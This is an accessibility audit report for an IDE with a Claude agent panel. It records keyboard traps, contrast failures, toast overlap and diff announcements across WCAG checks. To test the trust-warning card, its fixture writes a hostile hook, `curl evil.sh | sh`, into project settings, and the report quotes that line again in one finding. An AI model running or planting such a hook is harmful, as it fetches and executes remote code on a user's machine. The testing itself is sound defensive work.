# Iryna (accessibility user): Round 7 (2026-11-25)

Build: 3b6b65a on main, headless (scripted fake agent), Playwright Chromium
158.0.8127.36, 1280x800. Also 640x400 and 512x400 (200% zoom of a 1280 px and
a 1024 px window), 400x400 and 320x256 (WCAG reflow width), forced colours on,
reduced motion on.
Scope: the whole app after today's UX changes: header project switcher and
More menu, the right column (Approvals, Tasks, Claude card, trust card with
warnings), task form radios, start panel, Git, Search, editor, terminal, the
Reviews inbox and the More dialogs (Audit log, Project policies, Network and
secrets, Servers, Agent browser). Fixtures: `small` (seeded). For the trust
card the scripts wrote a `.claude/settings.json` with `Bash(*)`, a
PostToolUse hook `curl evil.sh | sh` and `ANTHROPIC_BASE_URL`, then changed it
after trusting. Ten scripts (s1-s10) ran from a scratch folder. A
MutationObserver logged every change inside `aria-live`, `role=status`,
`role=alert` and `role=log`, as a stand-in for what a screen reader says.
Contrast is computed from computed styles, with parent backgrounds and
opacity blended in.

## Summary

Iryna can do the full loop today: open a project, give Claude a task, answer
approvals with Y, read the trust warnings and keep a worker's changes in the
Reviews inbox, all by keyboard and screen reader. Round 4's worst problem,
reflow at 200% zoom, is fixed: nothing scrolls sideways down to 320 px, and
the inbox stacks into one column. The transcript is also quiet now. The worst
problems left are a terminal she cannot Tab out of, an approval toast that
covers the request she is reading at 200% zoom, and Git diffs whose added and
removed lines sound the same. Overall the new header menus, radios and
dialogs are solid. The rough spots are older surfaces (terminal, editor, Git
diff) and a set of grey and placeholder texts below 4.5:1.

## Re-check of round 4

| ID      | Severity then | Status now   | Notes                                                                                                                                                                                                                                                                                |
| ------- | ------------- | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| A11Y-26 | major         | fixed        | At 640, 512, 400 and 320 px, `scrollWidth` equals the viewport. The agents column moves under `main` (900 px query), then everything stacks (600 px query). `main` is 420 px wide at 640 and 512 px wide at 512. The inbox diff is 638x240 at 640x400 (`a11y-inbox-640-reflow.png`). |
| A11Y-27 | major         | partly fixed | Keep changes moves focus to the item heading `h3 "Worker: docs · Add notes"` (good). Trust project still sends focus to the file tree (`div[tree] "Files"`), away from the card she was reading. Not re-checked: Interrupt, Change path.                                             |
| A11Y-28 | major         | fixed        | Tool results are folded into `group "Tool output (1 line)"`, and Ovra notes into "What Claude was told". The polite region only says lines like "Claude: I will list the files, then fix the typo in README.md."                                                                     |
| A11Y-29 | major         | open, worse  | Screen reader mode is still off by default, and only a palette command turns it on. Shift+Tab no longer leaves the terminal, so it is now a keyboard trap (A11Y-36).                                                                                                                 |
| A11Y-30 | major         | open         | With changed settings and details open, the added hook reads `text: +` then `code: "Stop: curl evil.sh \| sh"`. The `aria-label="Added"` on the sign `span` is still ignored.                                                                                                        |
| A11Y-31 | minor         | partly fixed | The text is shorter ("Fix the typo in README needs approval: Run ls -la"), but the assertive region still ends with "Review ×", because the toast buttons are inside it.                                                                                                             |
| A11Y-34 | minor         | open         | In the inbox, Tab still goes checkbox → Keep changes → Reject… → comment → files → diff, so she decides before she has heard the diff. After keeping, the outcome is only "Kept.".                                                                                                   |
| A11Y-35 | polish        | open         | Inbox diff line numbers are still #8a8a96 on #16301e (4.17:1). Previous change and Next change still use Chromium's `auto 1px` ring.                                                                                                                                                 |

A11Y-32 and A11Y-33 were not re-checked this round.

## Measured contrast

Normal text needs 4.5:1. Disabled controls are exempt under WCAG, but she still has to read them.

| Text                                                         | Foreground / background | Ratio | Result             |
| ------------------------------------------------------------ | ----------------------- | ----- | ------------------ |
| Body text, headings                                          | #e6e6e6 / #16161a       | 14.46 | pass               |
| Muted text (hints, "Nothing waits…", trust detail)           | #b4b4c0 / #16161a       | 8.79  | pass               |
| Muted text on a raised surface (Tasks status, inbox meta)    | #b4b4c0 / #2a2a33       | 6.92  | pass               |
| Secondary grey (footer, sidebar tabs, kbd hints, Git labels) | #9a9aa6 / #16161a       | 6.48  | pass               |
| More menu description under the focused item                 | #9a9aa6 / #2a2a33       | 5.11  | pass               |
| Quiet trust card ("No Claude settings in this project")      | #9a9aa8 / #16161a       | 6.50  | pass               |
| Trust warnings, "(1 waiting)", "Waiting for review" (yellow) | #ffd36b / #16161a       | 12.70 | pass               |
| Link buttons (Change, Trust project, Show details)           | #9db8ff / #16161a       | 9.22  | pass               |
| Git "Nothing is staged…", folder names in Git list           | #8a8a96 / #16161a       | 5.29  | pass               |
| Search hit highlight                                         | #ffffff / #6b5a1e       | 6.76  | pass               |
| Placeholder, task box                                        | #757575 / #121216       | 4.06  | **fail**           |
| Placeholder, Git commit and Search fields                    | #757575 / #1e1e24       | 3.60  | **fail**           |
| Placeholder, Policy and Network dialogs                      | #757575 / #2a2a33       | 3.08  | **fail**           |
| Search per-file match count, tab "diff" hint                 | #6f6f7a / #16161a       | 3.64  | **fail**           |
| Editor gutter line numbers                                   | #5a5a66 / #16161a       | 2.65  | **fail**           |
| Inbox diff line numbers on added rows                        | #8a8a96 / #16301e       | 4.17  | **fail**           |
| Disabled Start, Send, Send comment                           | #919195 / #2a2a33       | 4.55  | pass (exempt)      |
| Disabled Commit                                              | #9da2af / #2f3d5c       | 4.24  | exempt, low        |
| Disabled editor Save (unstyled browser button)               | #424244 / #57575a       | 1.40  | exempt, unreadable |
| Focus ring, app standard                                     | #7aa2ff / #16161a       | 7.25  | pass               |
| Focus ring, start panel and search results                   | #4a6bb0 / #16161a       | 3.46  | pass (3:1), weak   |
| Button and input borders                                     | #4a4a57 / #16161a       | 2.07  | below 3:1          |

## Findings

### A11Y-36 major: the terminal traps the keyboard, and output is still silent by default

- **Area:** ui/src/terminal (TerminalView.svelte, Terminals.svelte)
- **Steps:** 1. Open `demo-app` and press Ctrl+Shift+`. Focus is on `textarea "Terminal input"`. 2. Press Shift+Tab, then Ctrl+Shift+Tab, Alt+Shift+Tab, F6, Ctrl+F6 and Escape. 3. Type `echo hello-$((40+2))` and Enter, then read the terminal with ariaSnapshot.
- **Expected:** One documented key leaves the terminal. In round 4 Shift+Tab moved focus to "Hide terminals". The input says how to leave (`aria-describedby`). Output can be read without knowing a palette command.
- **Actual:** Every key in step 2 leaves focus in `Terminal input`. The shell gets them as input: the prompt line now ends in `~;5~` (s10). Only Ctrl+`(hide terminals) and Ovra's own Alt+Shift shortcuts get her out, and nothing tells her so: the input has`aria-describedby=null`. The tabpanel exposes only the textbox, without "hello-42". Screen reader mode is off (`let screenReader = $state(false)`), there is no toggle in the terminal bar, and the setting is not kept.
- **Why it matters for Iryna:** she tabs into the terminal, cannot tab out, and hears nothing when she runs commands. With RSI she will not keep trying key combinations until one works. This is WCAG 2.1.2 (No Keyboard Trap), because leaving needs a non-standard key that nobody tells her about.
- **Suggested fix:** in `attachCustomKeyEventHandler`, let Shift+Tab (or Ctrl+Shift+Tab, if Shift+Tab must reach the shell) move focus to the terminal tab bar. Add `aria-describedby` with "Shift+Tab leaves the terminal. Ctrl+`hides it." Add a "Screen reader mode" toggle with`aria-pressed` to the bar, keep its state, and confirm the change in a status line. Add an e2e check that Shift+Tab from the terminal lands outside it.

### A11Y-37 major: at 200% zoom the approval toast covers the request she has to read

- **Area:** ui/src/notify (Notifications.svelte), ui/src/approvals
- **Steps:** 1. Set the window to 640x400 (200% of 1280x800) and start "Fix it". 2. Press Alt+Shift+A, then Tab to Allow.
- **Expected:** A focused approval card, and the command it asks about, are never hidden behind other content (WCAG 2.4.11/2.4.12). A toast for a request that is already on screen gets out of the way.
- **Actual:** The toast "Fix it needs approval: Run ls -la [Review] [×]" sits at 264,322 360x40, on top of the focused card (12,236 616x205), over the `command` and `description` values (`a11y-toast-over-approval-640.png`). It was still there 12 s later, and it stays until she answers or dismisses it. At 320 px it covers the start panel (s8 `w320.png`).
- **Why it matters for Iryna:** at her normal zoom, the line under the toast is the command she is about to allow. She has to notice the toast, dismiss it and find her place again, for every request.
- **Suggested fix:** when the request's card is visible or has focus, hide its toast or move it. Below 900 px, dock toasts at the top of the main area instead of over the bottom column. Or make the toast collapse to a one-line badge after a few seconds when the approval panel is on screen.

### A11Y-38 major: Git diff lines do not say added or removed

- **Area:** ui/src/git (GitDiff.svelte)
- **Steps:** 1. Open the Git view and press Enter on `main.rs src, modified`. 2. Read the hunk (ariaSnapshot of `main`).
- **Expected:** As in the inbox's PatchView, each line is spoken as "removed line 2: …" and "added line 2: …", or the diff is a table with row semantics, so she can move line by line.
- **Actual:** The hunk is one `group "Hunk 1 of 1, lines 1 to 3"` with a run of plain text: `fn main() { - println!("hello"); + println!("hello, world"); }`. Line numbers are `aria-hidden`, and the sign is just the first character of `line.text`. At NVDA's default punctuation level, a leading "-" is often not spoken, so a removed line sounds like an unchanged one. There are no "next change" keys here.
- **Why it matters for Iryna:** she stages hunks from this view before committing. If she cannot tell an added line from a removed one, she stages blind or switches to the terminal and `git diff`, which is silent too (A11Y-36).
- **Suggested fix:** reuse PatchView's line rendering (a table with `aria-rowindex`, plus hidden "added line N:" or "removed line N:" text and `aria-hidden` signs), or at least add that hidden text to each `.line`. Use the same N and P change navigation.

### A11Y-39 minor: placeholders and some grey text are below 4.5:1

- **Area:** ui/src/agents (task box), ui/src/git (commit message), ui/src/search, ui/src/policy, ui/src/network, ui/src/editor (Tabs.svelte "diff" hint), ui/src/viewers (PatchView line numbers)
- **Steps:** Measure computed colours on the task box, Git commit field, Search field, the Policy and Network dialog inputs, Search result counts, and the "diff" hint on a Git diff tab.
- **Expected:** At least 4.5:1, as the craft floor asks for placeholder text too.
- **Actual:** No input styles `::placeholder`, so Chromium's #757575 shows: 4.06 on the task box, 3.60 in Git and Search, 3.08 in the dialogs. The Git commit placeholder "Ctrl+Enter commits" is the only place that shortcut appears. Search match counts and the tab's "diff" hint are #6f6f7a, at 3.64. Inbox diff line numbers are 4.17 (A11Y-35).
- **Why it matters for Iryna:** at 200% zoom with low vision, 3:1 grey on near-black fades away. Where the placeholder holds the only hint, she misses it.
- **Suggested fix:** add a global `::placeholder { color: #9a9aa6; }` (6.48 on #16161a, 5.11 on #2a2a33). Raise #6f6f7a to #9a9aa6, and #8a8a96 on coloured rows to #a4a4b0. Put "Ctrl+Enter commits" in visible hint text next to the Commit button, as the task form does.

### A11Y-40 minor: the editor has no accessible name, faint line numbers and an unstyled Save button

- **Area:** ui/src/editor (Editor.svelte, theme.ts)
- **Steps:** 1. Open README.md and press Edit. 2. Read the editor's ARIA and measure contrast. 3. Type one character.
- **Expected:** The editing surface is named, for example "Edit README.md". Line numbers are readable. Save looks like the app's other buttons, enabled or not.
- **Actual:** `.cm-content` has `role=textbox` and no `aria-label` or `aria-labelledby`, so it is announced as "edit, multi-line" (`textbox` without a name). Gutter numbers are #5a5a66 on #16161a, 2.65:1. Save is the browser's default light button: bright white when enabled, and #424244 on #57575a (1.40:1) when disabled (`a11y-editor-gutter-save.png`). Its focus ring is the default one. Good: Escape then Tab leaves the editor, and the dirty tab reads "README.md, unsaved changes".
- **Why it matters for Iryna:** she uses line numbers to follow diagnostics and agent notes ("line 42"), and at 2.65:1 she cannot read them. An unnamed editor makes her confirm by ear which file she is typing into.
- **Suggested fix:** pass `EditorView.contentAttributes.of({ "aria-label": \`Edit ${path}\` })`. Set the gutter colour to at least #8a8a96 (5.29:1). Style Save and the conflict buttons with the shared button class and the #7aa2ff focus ring.

### A11Y-41 minor: in forced colours, the selected sidebar view cannot be seen

- **Area:** ui/src/shell (Shell.svelte, `.sidebar-tabs`)
- **Steps:** 1. Turn on forced colours (`emulateMedia({ forcedColors: "active" })`). 2. Look at Files, Search and Git.
- **Expected:** The pressed view stands out by a shape or a system colour, not only by a colour the system replaces.
- **Actual:** The selected tab differs only by text colour and a #4a6bb0 bottom border. In forced colours, all three get the same line and the same text colour, so the selected one cannot be told apart (`a11y-forced-colors-sidebar-tabs.png`). The `aria-pressed` state is correct for screen readers.
- **Why it matters for Iryna:** she sometimes uses Windows contrast themes. Then she cannot see whether the sidebar shows files, search or Git without opening it.
- **Suggested fix:** add `@media (forced-colors: active) { .sidebar-tabs button[aria-pressed="true"] { border-bottom-color: Highlight; font-weight: 600; } .sidebar-tabs button { border-bottom-color: Canvas; } }`, or mark the pressed tab with a weight change in all modes.

### A11Y-42 minor: the trust buttons go unavailable and come back without saying so, and Trust moves focus away

- **Area:** ui/src/agents/setup (ProjectTrust.svelte)
- **Steps:** 1. With project settings present, press Show details. 2. Tab to Trust project at once and press Enter. 3. Wait 1 s and press Enter again.
- **Expected:** While it is not ready, Trust says why (`aria-describedby`). When it becomes ready, that is announced once if the button has focus. After trusting, focus stays in the card, on the new heading "Project settings are on".
- **Actual:** Step 2 is good: the polite region says "Ready in a moment — read the card first." Opening details turns the button back to `aria-disabled=true`, with only a `title` as the reason and `aria-describedby=null`. When it becomes ready the region clears, and nothing is said. After the real trust, focus jumps to the file tree (`div[tree] "Files"`) on the other side of the screen (A11Y-27). The detail text also reads "(build scripts, for example)in the sandbox", with no space before "in".
- **Why it matters for Iryna:** she presses Trust, hears "Ready in a moment", and then has to guess when "a moment" is over. After trusting she lands in the tree without hearing that trust worked.
- **Suggested fix:** point `aria-describedby` at the wait paragraph while not armed. When the card arms with focus inside it, set the wait text to "Ready." After `projects.trust`, `await tick()` and focus `#trust-heading`. Fix the missing space in the Svelte template.

### A11Y-43 polish: landmarks, headings and names that read oddly

- **Area:** ui/src/shell (Shell.svelte), ui/src/tree (Tree.svelte), ui/src/audit, ui/src/policy, ui/src/network, ui/src/servers, ui/src/inbox, ui/src/agents (Tasks list), ui/src/palette
- **Steps:** List landmarks and headings on the start screen, with a project open, and in each More dialog. Type "screen reader" in the palette.
- **Actual:**
  1. There are two complementary landmarks. The sidebar has no name, and the right column is "Agents and approvals".
  2. On the start screen the sidebar's first heading is "File tree" (visually hidden), followed by "Projects". No tree is there.
  3. Each dialog's `<header>` is exposed as a `banner` landmark inside the dialog, so the landmark list shows several banners.
  4. Task buttons read "Fix the typo in README No sandbox Needs approval", with the three parts run together.
  5. The palette's status says "48 results", "31 results", "16 results"… on every keystroke.
- **Suggested fix:** `aria-label="Files, search and Git"` on the sidebar. Render "File tree" only when a project is open. Use `<div class="bar">` (or `role="none"`) for dialog headers. Join task parts with commas in the accessible name. Debounce the palette count by about 400 ms.

### A11Y-44 polish: focus rings and target sizes are uneven

- **Area:** ui/src/shell, ui/src/tree, ui/src/search, ui/src/agents, ui/src/git, ui/src/viewers
- **Steps:** Tab through the app at 1280x800 and log the computed outline of each focused control and the size of each control.
- **Actual:** Most controls use the 2 px #7aa2ff ring (7.25:1). The sidebar tabs, tree toolbar, recent-project button, Open folder field, search option toggles, the task radio input and the inbox Previous and Next buttons use Chromium's `auto 1px` ring. Search results use a 1 px #4a6bb0 outline, and the start panel a 2 px #4a6bb0 one (3.46:1). Several controls are under 24 px tall: Change and Trust project 44x15 and 72x15, Hide details 67x15, Stage all and Unstage all 16 px, transcript `summary` rows 14 px, and the search toggles 26x21. Checkboxes are 13x13, but their labels are clickable.
- **Suggested fix:** one global `:focus-visible { outline: 2px solid #7aa2ff; outline-offset: 1px; }` in the shell, with per-area overrides only where needed. Give link buttons and summaries `min-height: 24px` (padding, not a larger font).

## What worked well

- The new header menus follow the menu button pattern: Enter or ArrowDown opens and focuses the first item, arrows move, Escape returns focus to the button, and Tab closes and moves on. More items are `menuitem` with the description in `aria-describedby`. Agent browser is a `menuitemcheckbox`. Shortcuts are in `aria-keyshortcuts`, and the visible `kbd` is `aria-hidden`.
- Audit log, Project policies, Network and secrets, Servers and Review inbox are all modal dialogs: focus starts on the heading, Tab is trapped, and Escape returns focus to More.
- The task form's mode switch is a real `fieldset` with native radios. Arrow keys switch, the hint is in `aria-describedby` and updates, and the focused label shows a visible 2 px ring.
- Trust warnings are `role="note"`, start with "⚠" so they do not depend on colour, read as plain sentences that name the risk ("1 hook will run commands on your computer: …"), and are 12.7:1. In forced colours they keep the sign and the card border.
- Approvals: Alt+Shift+A focuses the card, Y works, a new request is announced assertively without stealing focus, and a Y on a card that is not focused does nothing.
- Reflow is fixed. Nothing scrolls sideways at 640, 512, 400 or 320 px, and the inbox becomes one column with a full-width diff.
- No animations run besides xterm's scrollbar fade, so reduced motion has nothing left to stop.
- The tree describes git status in words (`aria-describedby`: "modified", "untracked", "contains modified files"), and files show M and U letters as well as colour.
